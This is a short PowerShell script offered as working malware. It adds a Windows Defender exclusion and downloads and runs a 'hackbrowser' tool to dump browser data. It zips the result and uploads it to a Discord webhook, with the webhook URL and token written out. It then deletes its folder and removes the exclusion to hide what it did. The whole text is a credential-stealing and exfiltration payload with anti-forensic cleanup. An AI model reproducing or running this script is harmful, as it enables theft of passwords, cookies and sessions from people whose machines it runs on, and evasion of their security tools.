# Adding Windows Defender exclusion path
Add-MpPreference -ExclusionPath "$env:appdata"

# Creating the directory we will work on
mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"

# Downloading and executing hackbrowser.exe
Invoke-WebRequest 'hackbrowser.exe file link' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force

# Creating a ZIP Archive
Compress-Archive -Path * -DestinationPath dump.zip

# Sending ZIP file to Discord Webhook
$webhookUrl = "https://discord.com/api/webhooks/1336017465255395419/hyQPYER4FdcSWm_0FOdvOwVsEBGq3046B5wF2G3qePSzdAg9_yeNrGzw8UjibLTbXqhP"
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"dump.zip`"",
    "Content-Type: application/zip$LF",
    [System.IO.File]::ReadAllBytes("$env:appdata\Microsoft\dump\dump.zip") -join '',
    "--$boundary--$LF"
)

$body = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join $LF)

Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body

# Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"